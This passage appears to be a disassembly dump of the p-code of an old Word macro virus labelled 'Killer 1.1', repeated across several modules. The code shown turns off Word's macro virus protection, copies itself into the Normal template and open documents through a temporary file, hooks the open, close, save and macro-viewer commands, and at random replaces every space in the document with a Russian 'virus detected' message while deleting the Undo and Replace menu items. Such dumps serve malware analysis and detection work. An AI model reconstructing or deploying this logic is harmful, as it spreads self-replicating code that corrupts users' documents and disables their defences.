' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer3 - 5346 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer4 - 4762 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer5 - 4762 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer6 - 5346 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
